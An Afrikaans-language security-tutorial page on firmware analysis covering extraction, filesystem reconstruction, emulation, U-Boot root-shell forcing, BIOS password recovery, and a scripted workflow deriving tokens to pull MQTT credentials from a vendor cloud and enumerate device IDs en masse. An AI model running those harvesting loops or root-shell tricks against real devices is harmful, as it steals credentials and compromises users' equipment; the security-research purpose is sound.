# Firmware-ontleding

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Inleiding**

### Verwante hulpbronne

Vir verkryging vanaf blootgestelde hardeware-koppelvlakke, sien [UART-konsole-ondersteunde firmware-dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) en [SPI-flash-dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Vir herhaalbare UART-opname tydens selflaai voordat toegang tot die konsole verkry word, sien [SCPI-beheerde kragtoevoer- en ossilloskoopverkryging](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle korrek laat werk deur kommunikasie tussen die hardewarekomponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, sodat die toestel vanaf die oomblik dat dit aangeskakel word toegang tot noodsaaklike instruksies het en die bedryfstelsel kan begin. Die ondersoek en moontlike wysiging van firmware is ’n kritieke stap om sekuriteitskwesbaarhede te identifiseer.<sup>[[2]](#references)[[3]](#references)</sup>

## **Inligting insamel**

**Inligting insamel** is ’n kritieke eerste stap om ’n toestel se samestelling en die tegnologieë wat dit gebruik, te verstaan. Hierdie proses behels die insameling van data oor:

- Die SVE-argitektuur en bedryfstelsel waarop dit werk
- Besonderhede oor die bootloader
- Hardeware-uitleg en datablaaie
- Kodebasismaatstawwe en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifisering
- Argitektuur- en vloeidiagramme
- Sekuriteitsbeoordelings en geïdentifiseerde kwesbaarhede

**Oopbronintelligensie (OSINT)**-nutsmiddels is hiervoor van onskatbare waarde, asook die ontleding van enige beskikbare oopbronsagtewarekomponente deur handmatige en geoutomatiseerde hersieningsprosesse. Nutsmiddels soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese ontleding wat gebruik kan word om moontlike probleme te vind.

## **Firmware verkry**

Firmware kan op verskeie maniere verkry word, elk met ’n eie kompleksiteitsvlak:

- **Direk** vanaf die bron (ontwikkelaars, vervaardigers)
- Deur dit **te bou** volgens verskafte instruksies
- Deur dit van amptelike ondersteuningswebwerwe af **te laai**
- Deur **Google dork**-navrae te gebruik om gehoste firmwarelêers te vind
- Deur direk toegang tot **wolkberging** te verkry, met nutsmiddels soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Deur **opdaterings** met man-in-the-middle-tegnieke te onderskep
- Deur dit uit die toestel te **onttrek** via verbindings soos **UART**, **JTAG** of **PICit**
- Deur in toestelkommunikasie na opdateringsversoeke te **luister**
- Deur **hardgekodeerde opdaterings-eindpunte** te identifiseer en te gebruik
- Deur dit vanaf die bootloader of netwerk te **dump**
- Deur die bergingskyfie te **verwyder en uitlees**, wanneer niks anders werk nie, met geskikte hardeware-nutsmiddels

### Slegs UART-logboeke: dwing ’n root-shell af via U-Boot-omgewing in flash

As UART RX geïgnoreer word (slegs logboeke), kan jy steeds ’n init-shell afdwing deur die **U-Boot-omgewingsblob** vanlyn te wysig:<sup>[[6]](#references)</sup>

1. Dump SPI-flash met ’n SOIC-8-knip en programmeerder (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Vind die U-Boot env-partisie, wysig `bootargs` om `init=/bin/sh` in te sluit, en **herbereken die U-Boot env CRC32** vir die blob.
3. Flits slegs die env-partisie weer en herlaai; ’n dop behoort op UART te verskyn.

Dit is nuttig op ingebedde toestelle waar die selflaailaaier se dop gedeaktiveer is, maar die env-partisie via eksterne flashtoegang skryfbaar is.

## Ontleding van die firmware

Noudat jy **die firmware het**, moet jy inligting daaroor onttrek om te weet hoe om dit te hanteer. Verskillende nutsmiddels wat jy hiervoor kan gebruik:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

As jy nie veel met daardie nutsgoed vind nie, kontroleer die **entropie** van die image met `binwalk -E <bin>`; as die entropie laag is, is dit waarskynlik nie geënkripteer nie. As die entropie hoog is, is dit waarskynlik geënkripteer (of op een of ander manier saamgepers).

Jy kan ook hierdie nutsgoed gebruik om **lêers wat in die firmware ingebed is** te onttrek:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of gebruik [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te ondersoek.

### Differensiële flash-analise en herwinbare XOR-geheime stoorplekke

Wanneer ’n firmware-instelling geen gedokumenteerde stoorformaat het nie, neem eers verskeie ooreenstemmende flash-lesings, verander **presies een** instelling, dump die volledige skyfie weer en vergelyk die offsets. Deur die eksperiment met beheerde waardes te herhaal, kan jy die instelling van tellers en skryfmetadata onderskei; veranderinge by nuwe offsets eerder as in plek dui op ’n slegs-byvoegende of loggestruktureerde stoorplek. Behou geskrapte/tombstone-inskrywings, want hul loonvraggrepe kan dalk steeds herwin word.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nadat jy die streek opgespoor het, onttrek die firmware-modules met nutsprogramme soos `binwalk` en reverse engineer die writer/validator in Ghidra. Bevestig die veldgrense, padding, sleutelindeksering en sleutelafleiding in die kode, eerder as om die skema net uit ciphertext-patrone af te lei.<sup>[[12]](#references)</sup>

#### Herwin sleutels uit geënkripteerde nul-padding

Soos beskryf in [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), onthul bekende plaintext keystream-grepe by dieselfde offsets. ’n Veld met ’n vaste grootte is veral kwesbaar wanneer sy nul-padding elke indeks van ’n herhalende XOR-sleutel dek: die geënkripteerde padding onthul daardie sleutelgrepe direk, omdat `0x00 XOR key_byte = key_byte`. As elke sleutelindeks gedek word, rekonstrueer die sleutel uit die ciphertext-stert en dekripteer die ingevulde grepe.<sup>[[12]](#references)</sup>

Dell se kwesbare DVAR BIOS-wagwoordformaat is ’n konkrete voorbeeld: greep `0` van ’n 32-greep-veld is plaintext, terwyl grepe `1..31` ’n herhalende 20-greep-sleutel gebruik.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Vir ’n wagwoordlengte `L` was posisies `L..31` nul voor XOR. Wanneer `L <= 12`, dek daardie posisies elke sleutelindeks, dus word die volledige sleutel en wagwoord sonder brute force herwin:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Haal sleutels uit historiese rekords

Moenie elke rekord afsonderlik ontleed nie. Die DVAR-sleutel word ongeveer afgelei as `modified_md5(device_seed || variable_GUID || password[0])`: die toestel-seed en GUID is vas, en die enigste wagwoordafhanklike invoer is die duidelike eerste byte. Dit gee hoogstens 256 sleutels per toestel, en rekords wat met dieselfde byte begin, deel dus ’n sleutel. Groepeer aktiewe en geskrapte rekords volgens daardie byte; ’n kort historiese rekord kan die volle sleutel deur padding uitlek en ’n huidige, langer rekord dekripteer waarvan die eie padding onvoldoende is. Wagwoordrotasie kan dus blootstelling verhoog wanneer ou ciphertext getombstone word eerder as uitgevee.<sup>[[12]](#references)</sup>

Die [`dellpwn`](https://github.com/R3n5k1/dellpwn)-tool vind DVAR, valideer kandidaat-rekords, herwin wagwoorde en kan rou gestoorde/sleutel-bytes vertoon. Bou dit vanuit ’n checkout en skandeer ’n geverifieerde flash image soos volg:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Vir pasgemaakte parsers, verwerp vals positiewe met rekordstruktuur, beperkings op drukbare karakters, kontroles vir nulopvulling, sleutelentropie en konsekwentheid waar die sleutel omvou. As herhaalde dumps yl biswisselings per skryfbewerking toon, lys die waargenome maskers en rangskik regstellings volgens hierdie beperkings, maar rapporteer dubbelsinnige karakters eerder as om heuristiese uitvoer as presiese herwinning voor te stel.<sup>[[12]](#references)</sup>

Wagwoordverifieerders behoort ’n gesoute, herhaalde eenrigtinghash te stoor eerder as omkeerbare syferteks, en loggestruktureerde stoorsisteme behoort verouderde geheime materiaal veilig te verwyder.<sup>[[12]](#references)</sup>

### Kry die lêerstelsel

Met die voorheen genoemde kommentaarhulpmiddels soos `binwalk -ev <bin>` behoort jy **die lêerstelsel te kon onttrek**.\
Binwalk onttrek dit gewoonlik in ’n **vouer wat na die lêerstelseltipe vernoem is**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige onttrekking van die lêerstelsel

Soms sal binwalk **nie die magic byte van die lêerstelsel in sy handtekeninge hê nie**. Gebruik in hierdie gevalle binwalk om **die lêerstelsel se offset te vind en die saamgeperste lêerstelsel** uit die binêre lêer te kerf, en **onttrek** die lêerstelsel handmatig volgens sy tipe met die stappe hieronder.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Voer die volgende **dd-opdrag** uit om die Squashfs-lêerstelsel te onttrek.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (wat in die voorbeeld hierbo gebruik word)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die gids "`squashfs-root`" wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND-flitsgeheue

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Herbou van gesplete ingebedde wortellêerstelsels

As ’n rou eMMC/SSD-dump ’n geldige lêerstelselkopskrif bevat, maar die metadata se offsets buite die nominale partisie strek, moet dit nie dadelik as korrup geklassifiseer word nie. Ingebedde selflaaikode kan die werklike worteltoestel uit verskeie fisiese reekse met Device Mapper saamstel, sodat die uitsny van een GPT-partisie slegs die eerste segment oplewer.<sup>[[9]](#references)</sup>

#### Triage van die volledige mediabeeld

Verifieer eers dat die verkryging voltooi is, die grootte stabiel is en geen skrywer die beeld steeds gebruik nie. As die lêernaam ’n begin-/eindadres kodeer, vergelyk daardie reeks met die werklike aantal grepe. Herstel die GPT in leesalleenmodus en heg slegs die vereiste reeks aan; moenie `vgchange -ay` teen ’n onvertroude fisiese volume op die werkstasie uitvoer nie, aangesien volumegroepbotsings en onbedoelde skryfbewerkings moontlik is.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Verkies ’n weggooibare VM wanneer die oorspronklike init-logika of ’n LVM-stack die hele image moet kan sien. Historiese boot logs van ’n standaard boot-partisie is veral nuttig: die bootloader het dalk die proprietary-container se offsets, komponentlengtes, slotkeuse, belyningsreëls en handtekeningverifikasie aangeteken. Gebruik daardie waardes om ’n ingebedde command line/kernel/initramfs uit te sny, en valideer elke uitvoer afsonderlik met `file`, magic bytes en `binwalk`; as jy tot aan die einde van die container lees, kan jy per ongeluk ’n initrd, ACPI-object of handtekening by die kernel voeg.<sup>[[9]](#references)</sup>

#### Herwin die blokkaart tydens opstart

Pak die kernel se initramfs uit en reverse-engineer sy `/init` plus enige storage libraries. Volg in [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) stringverwysings vir `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` en partisiepaaie; spoor dan die kode na wat die aktiewe A/B-slot kies en die tabel opstel. Nuttige beginpunte in radare2 is `r2 -A init`, `afl`, `pdf @ main` en `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Die linear target karteer opeenvolgende reekse van ’n virtuele toestel na reekse op een of meer backing devices. ’n Herwonne tabel met twee segmente het gewoonlik hierdie vorm (alle posisies en lengtes is 512-greep-sektore):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduseer die masjienkode-rekenkunde presies, insluitend heelgetalwydte, bitverskuiwings en eenheidsomskakelings. Die volgende uitdrukking rond byvoorbeeld ’n grootte in grepe af tot ’n 4-KiB-grens en skakel dit eers daarna om na 512-grepe-sektore; as jy dit vervang met `p4_bytes // 512`, verskuif die gekose einde met `p4_bytes % 4096` wanneer die partisie nie op ’n bladsygrens val nie.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstrueer ’n plat analisebeeld deur die reekse in tabelvolgorde met begrensde stukke te kopieer, eerder as om die volledige mediadump in die geheue te laai. Dit voorkom ook dat mapper-toestelle aan die host-kant geskep word. Hou die GPT-afgeleide offsets, omgekeerde sektortellings en gevolglike uitvoerlengte as afsonderlike bewerings.<sup>[[9]](#references)</sup>

#### Onderskei korrupsie van ’n konstante rekonstruksiefout

Kontroleer vir SquashFS die `hsqs`-magic en dekodeer die little-endian 64-bis `bytes_used`-veld by superblok-offset 40 voordat jy `unsquashfs` uitvoer. As ekstraksie in verskeie onverwante strukture misluk, soek ’n breë venster rondom die verwagte posisies en vereis sterk strukturele kandidate: ’n dekomprimeerbare metadata-blok, verskeie opeenvolgende geldige gidsinskrywings, aanneemlike inode-velde, ’n wortelinode wat met die inode-telling ooreenstem, of ’n geldige integriteitsmetadat struktuur. Een enkele magic-treffer is onvoldoende.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wanneer dieselfde getekende delta onafhanklike strukture geldig maak—byvoorbeeld gidsmetadata en ’n verity-rekord—is die waarskynlike oorsaak ’n sistematiese fout in die segmentbegin, eerder as ontbrekende grepe. Gaan terug na die omgekeerde berekening en soek na weggegooide reswaardes, getekendheid, oorloop of sektor-/bladsyafronding voordat jy probeer om verweesde data te herstel of lêerstelselmetadata reg te maak.<sup>[[9]](#references)</sup>

Hou laastens die beskermingsgrense apart: TPM-verseëlde LUKS-volumes beskerm datavertroulikheid, terwyl ’n getekende dm-verity-koppeling die integriteit van die wortellêerstelsel beskerm. ’n Sagteware-TPM herstel nie ’n sleutel wat aan die oorspronklike fisiese TPM verseël is nie, en om ’n aangepaste SquashFS te selflaai deur ’n navorsingsdoeleindes-enigste init wat verity-verifikasie weglaat, vervals nie die handtekening daarvan of breek dm-verity nie.<sup>[[9]](#references)</sup>

## Firmware ontleed

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om die struktuur en moontlike kwesbaarhede daarvan te verstaan. Hierdie proses behels die gebruik van verskeie nutsgoed om die firmwarebeeld te ontleed en waardevolle data daaruit te onttrek.

### Aanvanklike ontledingsnutsgoed

’n Stel opdragte word verskaf vir aanvanklike inspeksie van die binêre lêer (na verwys as `<bin>`). Hierdie opdragte help om lêertipes te identifiseer, stringe te onttrek, binêre data te ontleed en die besonderhede van partisies en lêerstelsels te verstaan:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Om die enkripsiestatus van die image te bepaal, word die **entropie** met `binwalk -E <bin>` nagegaan. Lae entropie dui op ’n gebrek aan enkripsie, terwyl hoë entropie op moontlike enkripsie of kompressie dui.

Vir die onttrekking van **ingebedde lêers** word nutsmiddels en hulpbronne soos die dokumentasie **file-data-carving-recovery-tools** en **binvis.io** vir lêerinspeksie aanbeveel.

### Onttrekking van die lêerstelsel

Met `binwalk -ev <bin>` kan ’n mens gewoonlik die lêerstelsel onttrek, dikwels na ’n gids wat na die lêerstelseltipe vernoem is (bv. squashfs, ubifs). Wanneer **binwalk** egter nie die lêerstelseltipe herken nie weens ontbrekende magic bytes, is handmatige onttrekking nodig. Dit behels die gebruik van `binwalk` om die lêerstelsel se offset te vind, gevolg deur die `dd`-opdrag om die lêerstelsel uit te sny:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daarna word verskillende opdragte gebruik om die inhoud handmatig te onttrek, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs).

### Lêerstelselontleding

Sodra die lêerstelsel onttrek is, begin die soektog na sekuriteitsfoute. Daar word gelet op onveilige netwerkdaemone, hardgekodeerde geloofsbriewe, API-eindpunte, opdateringbedienerfunksies, ongecompileerde kode, opstarts skrifte en gecompileerde binêre lêers vir vanlyn ontleding.

**Belangrike liggings** en **items** om te ondersoek, sluit in:

- **etc/shadow** en **etc/passwd** vir gebruikersgeloofsbriewe
- SSL-sertifikate en -sleutels in **etc/ssl**
- Konfigurasie- en skriflêers vir moontlike kwesbaarhede
- Ingebedde binêre lêers vir verdere ontleding
- Algemene webbedieners en binêre lêers vir IoT-toestelle

Verskeie nutsmiddels help om sensitiewe inligting en kwesbaarhede in die lêerstelsel op te spoor:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) om na sensitiewe inligting te soek
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-ontleding
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese ontleding

### Sekuriteitskontroles op gecompileerde binêre lêers

Beide bronkode en gecompileerde binêre lêers wat in die lêerstelsel gevind word, moet vir kwesbaarhede ondersoek word. Nutsmiddels soos **checksec.sh** vir Unix-binêre lêers en **PESecurity** vir Windows-binêre lêers help om onbeskermde binêre lêers te identifiseer wat uitgebuit kan word.

## Verkryging van wolkkonfigurasie en MQTT-geloofsbriewe via afgeleide URL-tokens

Baie IoT-hubs haal hul toestelspesifieke konfigurasie van ’n wolkeindpunt af wat soos volg lyk:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-ontleding kan jy vind dat `<token>` plaaslik van die toestel-ID afgelei word met behulp van ’n hardgekodeerde geheim, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Hierdie ontwerp stel enigiemand wat ’n deviceId en die STATIC_KEY ken in staat om die URL te herskep en die wolkkonfigurasie af te laai. Dit onthul dikwels MQTT-geloofsbriewe in gewone teks en onderwerpvoorvoegsels.

Praktiese werksvloei:

1) Onttrek deviceId uit UART-opstartlogboeke

- Koppel ’n 3.3V UART-adapter (TX/RX/GND) en neem die logboeke vas:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Soek na reëls wat die cloud config-URL-patroon en broker-adres vertoon, byvoorbeeld:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek die config-pad ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Lei die token in Bash af en skryf die digest in hoofletters:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Versamel wolkkonfigurasie en MQTT-geloofsbriewe

- Stel die URL saam en haal JSON met curl op; ontleed dit met jq om geheime te onttrek:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Misbruik plaintext MQTT en swak topic-ACL's (indien teenwoordig)

- Gebruik herwonne credentials om op maintenance topics in te teken en na sensitiewe gebeurtenisse te soek:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Lys voorspelbare toestel-ID's (op groot skaal, met magtiging)

- Baie ekosisteme sluit vervaardiger-OUI-/produk-/tipegrepe in, gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's iteratief probeer, tokens aflei en konfigurasies programmaties ophaal:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Aantekeninge
- Verkry altyd uitdruklike magtiging voordat jy mass enumerasie probeer.
- Verkies emulasie of statiese analise om geheime te herwin sonder om teikenhardeware te wysig, waar moontlik.


Die proses om firmware te emuleer, maak **dynamic analysis** moontlik van óf ’n toestel se werking óf ’n individuele program. Hierdie benadering kan uitdagings met hardeware- of argitektuurafhanklikhede teëkom, maar die oordrag van die root-lêerstelsel of spesifieke binaries na ’n toestel met ooreenstemmende argitektuur en endianness, soos ’n Raspberry Pi, of na ’n voorafgeboude virtuele masjien, kan verdere toetsing vergemaklik.

### Emulasie van individuele binaries

Wanneer enkele programme ondersoek word, is dit noodsaaklik om die program se endianness en CPU-argitektuur te identifiseer.

#### Voorbeeld met MIPS-argitektuur

Om ’n binary vir die MIPS-argitektuur te emuleer, kan jy die volgende opdrag gebruik:

```bash
file ./squashfs-root/bin/busybox
```

En om die nodige emulasienutsgoed te installeer:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian binaries is `qemu-mipsel` die gepaste keuse.

#### ARM-argitektuuremulasie

Vir ARM-binaries is die proses soortgelyk, met die `qemu-arm`-emulator wat vir emulasie gebruik word.

### Volledige stelselemulasie

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) en ander maak volledige firmware-emulasie moontlik, outomatiseer die proses en help met dinamiese analise.

### Heropbou van gesplete en geverifieerde wortellêerstelsels vir emulasie

As ’n SquashFS-superblok leesbaar is, maar inode-, gids- of fragmenttabel-offsets onmoontlik lyk, moet jy nie dadelik `unsquashfs` patch nie. Reverse-engineer die vroeë selflaaibinêre lêer en reproduseer die bloktoestelgrafiek wat dit skep: ingebedde stelsels kan ’n nominale wortelpartisie blootstel, maar die werklike lêerstelsel opbou met ’n `dm-linear`-kartering wat sektore wat by ’n ander partisie geleen is, aanheg. Kontroles wat net die superblok betref, kan slaag selfs wanneer elke daaropvolgende metadatablok verskuif is.<sup>[[11]](#references)</sup>

Behou die firmware se rekenkundige bewerkings presies. Bepaal veral of lengtes in grepe, 512-greep-sektore of 4 KiB-bladsye uitgedruk word; reproduseer verskuiwings en afkapping in hul oorspronklike volgorde; en neem bankafhanklike stertstreke in A/B-uitlegte in ag. Byvoorbeeld, `(partition_bytes >> 12) << 3` kap eers af tot ’n 4 KiB-grens en druk die resultaat dan in 512-greep-sektore uit; as jy dit met `partition_bytes // 512` vervang, kan die aangehegte omvang ’n paar kilogrepe verskuif en alle daaropvolgende SquashFS-tabelle beskadig.<sup>[[11]](#references)</sup>

’n Nuttige valideringswerkvloei is:<sup>[[11]](#references)</sup>

1. Bepaal die brontoestel, begint sektor en lengte van elke `dm-linear`-segment uit die verifikasie-/init-binêre lêer.
2. Voeg die omvangs saam of karteer hulle sonder om hul belyningssemantiek te verander.
3. As ekstraksie steeds misluk, soek slegs binne ’n klein venster rondom die voorspelde grens en vereis verskeie opeenvolgende geldige metadatastrukture, eerder as om ’n geloofwaardige superblok alleen te aanvaar.
4. Laat ’n onveranderde `unsquashfs` op die gerekonstrueerde image loop; suksesvolle deurloop van alle gidse en fragmente is sterker bewys as `unsquashfs -stat`.

#### Vervanging van dm-verity onder beheer van die ontleder

Wanneer die ontleder beheer oor die QEMU-kern, initramfs en virtuele skywe het, kan ’n gewysigde wortel selflaai deur die verskaffer se verifikasie-PID 1 met ’n klein staties geskakelde init te vervang. Dit is ’n **lab-selflaaikettingsubstitusie**, nie ’n verbreking van dm-verity, sy RSA-handtekening, Secure Boot of ’n TPM-verseëlde sleutel nie.<sup>[[11]](#references)</sup>

Die vervangende init moet die operasionele dele van die oorspronklike selflaaipad weerspieël: mount `devtmpfs`, roep `setsid()` aan, koppel `/dev/console` aan lêerbeskrywers 0–2, mount `/proc` en `/sys`, wag vir die verskafte bloktoestel, mount die gewysigde wortel as leesalleen, ontkoppel die pseudo-lêerstelsels van die ou wortel, skuif die nuwe mount na `/`, roep `chroot` aan en voer die firmware se oorspronklike `/sbin/init` met `execve()` uit. Deur `/dev`, `/proc` en `/sys` **voor** `MS_MOVE` te ontkoppel, voorkom jy dat mount-punte wat aan die nuwe wortel behoort, per ongeluk ontkoppel word.<sup>[[11]](#references)</sup>

Hou veranderbare toesteltoestand apart van die gewysigde onveranderlike wortel. ’n qcow2-overlay kan die oorspronklike skyf se LVM-toestand behou, terwyl ’n tweede leesalleen virtio-skyf die gewysigde SquashFS verskaf:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Ontfouting van aflyn beeldtoestand

Ondersoek aanhoudende toestand buite die guest wanneer stadige selflaaie, vernietigende opstartskripte of onbetroubare konsole-aantekening die fout verdoesel. Moet nooit ’n overlay koppel wat ’n VM wat loop, gebruik nie; stel dit met `qemu-nbd` beskikbaar, beperk LVM-ontdekking tot die bedoelde NBD-partisie en deaktiveer die volumegroep voordat jy dit ontkoppel.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Vir herhaalbare foutisolasie, skryf tydgestempelde merkerlêers na ’n stabiele skryfbare volume en verifieer hulle vanlyn; `/dev/kmsg`, FIFO’s en tydelike konsoles kan vals negatiewe resultate oplewer weens tempobeperking of voortydige prosesbeëindiging. Vergelyk ook presiese koppelvlakke oor lae heen voordat jy onverwante kode verander: `uname -r` teenoor `/lib/modules/`, ext4-kenmerke op skyf teenoor die kernkonfigurasie, en die Mesa `libGL`-generasie teenoor die DRI-bestuurder-ABI en PCI-afgeleide bestuurdername. ’n Komponent kan bestaan en selfs `dlopen()` suksesvol uitvoer, maar steeds onbruikbaar wees omdat die verbruiker ’n ander ABI verwag.<sup>[[11]](#references)</sup>

## Dinamiese Analise in die Praktyk

